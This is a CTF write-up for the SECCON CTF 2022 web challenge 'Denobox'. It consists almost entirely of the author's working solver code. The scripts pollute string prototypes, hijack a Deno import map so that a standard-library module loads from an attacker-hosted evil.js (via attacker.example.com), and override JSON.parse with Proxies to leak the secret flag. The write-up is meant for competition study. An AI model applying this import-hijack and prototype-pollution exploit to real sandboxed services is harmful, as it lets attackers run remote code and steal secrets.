---
title: "Denobox - SECCON CTF 2022 Quals"
category: "web"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "denobox", "web", "seccon-ctf-2022-quals"]
summary: "Your program runs in a sandbox!"
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202211_SECCON_CTF_2022_Quals/web/denobox"
license: "none stated"
ctf:
  name: "SECCON CTF 2022 Quals"
  year: 2022
  challenge: "Denobox"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202211_SECCON_CTF_2022_Quals/web/denobox>
- **CTF:** SECCON CTF 2022 Quals

---

# [web] denobox

## Description

Your program runs in a sandbox!

- `http://denobox.seccon.games:3000`

## Attachments

- [denobox](files/denobox)

## Usage

Launch a challenge server:

```
cd build
docker compose up
```

Run the author's solver:

```
docker run -it \
    -e SECCON_BASE_URL=http://localhost:3000 \
    -e ATTACK_BASE_URL=http://attacker.example.com \
    -p 8080:8080 --network=host \
    (docker build -q ./solver)
```


## Solver: `evil.js`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202211_SECCON_CTF_2022_Quals/web/denobox/solver/evil.js>

```javascript
export const crypto = {
  randomUUID: () => ({
    replaceAll: () => "dummy",
  }),
};

const proxy1 = new Proxy(
  {},
  {
    has(target, propertyKey) {
      console.log(propertyKey); // output a flag
      return Reflect.has(...arguments);
    },
  }
);

const proxy2 = new Proxy(
  {},
  {
    set(target, property, value, receiver) {
      Object.setPrototypeOf(value, proxy1);
      return Reflect.set(...arguments);
    },
  }
);

JSON.parse = () => proxy2;
```


## Solver: `index.js`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202211_SECCON_CTF_2022_Quals/web/denobox/solver/index.js>

```javascript
const fastify = require("fastify")();
const fs = require("node:fs");

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const SECCON_BASE_URL =
  process.env.SECCON_BASE_URL || fail("No SECCON_BASE_URL");
const ATTACK_BASE_URL =
  process.env.ATTACK_BASE_URL || fail("No ATTACK_BASE_URL");

const LISTEN_PORT = process.env.PORT || "8080";

const sleep = (msec) => new Promise((resolve) => setTimeout(resolve, msec));

const source = `
  output.importMap = input.importMap;
  output.imports = input.imports;
  "".constructor.prototype.replaceAll = "".constructor.raw;
  "".constructor.prototype.raw = input.filename;

  input.key = output;
`;

const importMapJson = JSON.stringify({
  filename: "import_map",
  imports: {
    "https://deno.land/std@0.161.0/crypto/mod.ts": `${ATTACK_BASE_URL}/evil.js`,
  },
});

const denoJson = JSON.stringify({
  filename: "deno",
  importMap: "import_map.json",
});

const exploit = async () => {
  const path = await (
    await fetch(`${SECCON_BASE_URL}/`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        source,
      }),
    })
  ).text();

  await fetch(`${SECCON_BASE_URL}${path}/run`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      input: importMapJson,
    }),
  });

  await fetch(`${SECCON_BASE_URL}${path}/run`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      input: denoJson,
    }),
  });

  const flag = await (
    await fetch(`${SECCON_BASE_URL}${path}/run`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        input: "",
      }),
    })
  ).text();

  console.log(flag);
};

const start = async () => {
  const evilJs = fs.readFileSync("evil.js").toString();
  fastify.get("/evil.js", async (req, reply) => {
    return evilJs;
  });

  fastify.listen(
    { port: LISTEN_PORT, host: "0.0.0.0" },
    async (err, address) => {
      if (err) fail(err);

      await sleep(1000);
      await exploit();
      fastify.close();
    }
  );
};
start();
```
